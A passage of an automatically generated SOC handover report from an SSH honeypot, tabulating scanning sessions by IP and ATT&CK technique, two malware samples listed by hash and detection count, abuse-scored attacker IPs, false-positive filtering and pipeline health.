| `13.218.248.210` | 1 | 2026-03-09 12:54 | 2026-03-09 12:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `131.196.22.217` | 1 | 2026-03-09 01:15 | 2026-03-09 01:15 | 31s | 0 | `T1592` | 🟢 LOW |
| `150.246.249.149` | 1 | 2026-03-09 00:23 | 2026-03-09 00:24 | 31s | 0 | `T1592` | 🟢 LOW |
| `157.15.59.111` | 1 | 2026-03-09 06:51 | 2026-03-09 06:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.232.176.32` | 1 | 2026-03-09 14:06 | 2026-03-09 14:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.13.79` | 1 | 2026-03-09 04:58 | 2026-03-09 04:59 | 32s | 0 | `T1592` | 🟢 LOW |
| `177.75.49.5` | 1 | 2026-03-09 13:17 | 2026-03-09 13:17 | 12s | 0 | `T1592` | 🟢 LOW |
| `180.103.119.98` | 1 | 2026-03-09 11:19 | 2026-03-09 11:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.52.206` | 1 | 2026-03-09 13:27 | 2026-03-09 13:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.184.86.82` | 1 | 2026-03-09 13:33 | 2026-03-09 13:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.250.38` | 1 | 2026-03-09 04:16 | 2026-03-09 04:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.250.89.44` | 1 | 2026-03-09 02:34 | 2026-03-09 02:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.216.153` | 1 | 2026-03-09 06:11 | 2026-03-09 06:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.39.72.50` | 1 | 2026-03-09 12:43 | 2026-03-09 12:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `200.74.84.36` | 1 | 2026-03-09 09:06 | 2026-03-09 09:07 | 31s | 0 | `T1592` | 🟢 LOW |
| `31.13.194.206` | 1 | 2026-03-09 02:53 | 2026-03-09 02:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `43.142.113.25` | 1 | 2026-03-09 05:18 | 2026-03-09 05:18 | 31s | 0 | `T1592` | 🟢 LOW |
| `43.224.126.107` | 1 | 2026-03-09 03:03 | 2026-03-09 03:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `47.236.83.218` | 1 | 2026-03-09 00:53 | 2026-03-09 00:53 | 30s | 0 | `T1592` | 🟢 LOW |
| `47.251.72.8` | 1 | 2026-03-09 01:46 | 2026-03-09 01:46 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.240.223.240` | 1 | 2026-03-09 05:01 | 2026-03-09 05:01 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.6.199.87` | 1 | 2026-03-09 06:05 | 2026-03-09 06:05 | 10s | 0 | `T1592` | 🟢 LOW |
| `78.181.19.18` | 1 | 2026-03-09 05:00 | 2026-03-09 05:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.95.221` | 1 | 2026-03-09 07:41 | 2026-03-09 07:41 | 2s | 0 | `T1592` | 🟢 LOW |
| `89.180.41.175` | 1 | 2026-03-09 06:10 | 2026-03-09 06:10 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (2 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.123.41.71` | PK | CMPak Limited | **100** ⚠️ | 3 |
| `110.37.18.101` | PK | National Wimax/IMS environment | **100** ⚠️ | 0 |
| `34.140.186.44` | BE | Google LLC | **100** ⚠️ | 0 |
| `157.15.59.120` | NP | Global Trading And IT Solution Pvt. Ltd. | **100** ⚠️ | 2 |
| `1.213.214.233` | KR | LG DACOM Corporation | **100** ⚠️ | 15 |
| `112.53.99.37` | CN | China Mobile Communications Corporation | **100** ⚠️ | 37 |
| `80.94.95.221` | RO | UNMANAGED LTD | **100** ⚠️ | 50 |
| `165.232.176.32` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `59.5.190.226` | KR | Korea Telecom | **100** ⚠️ | 2 |
| `43.224.126.107` | LK | Lanka Government Cloud | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | — |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | — |
| [T1078](https://attack.mitre.org/techniques/T1078) | — |
| [T1083](https://attack.mitre.org/techniques/T1083) | — |
| [T1105](https://attack.mitre.org/techniques/T1105) | — |

---

## 🔕 False Positive Summary (89 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 11 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 10 below threshold 25 | 1 |
| AbuseIPDB score 13 below threshold 25 | 9 |
| AbuseIPDB score 15 below threshold 25 | 7 |
| AbuseIPDB score 19 below threshold 25 | 1 |
| AbuseIPDB score 2 below threshold 25 | 4 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 7 |
| AbuseIPDB score 4 below threshold 25 | 15 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05 | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26 | Incident Timeline Generator | ✅ 316 session(s) |
| Tool 27 | Threat Intel Feeder         | ✅ 101 IP(s) enriched |
| Tool 29 | False Positive Tracker      | ✅ 89 filtered (28.2%) |
| Tool 30 | Metric Exporter             | ✅ stats.json written |
| Tool 31 | Malware Analyzer            | ✅ 2 file(s) analyzed |
| Tool 28 | SOC Handover Report         | ✅ This report |

> **Report grouping:** 41 priority case(s) shown individually · 66 recon entry/entries in table (25 group(s) consolidating 145 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-09T14:58:33Z_
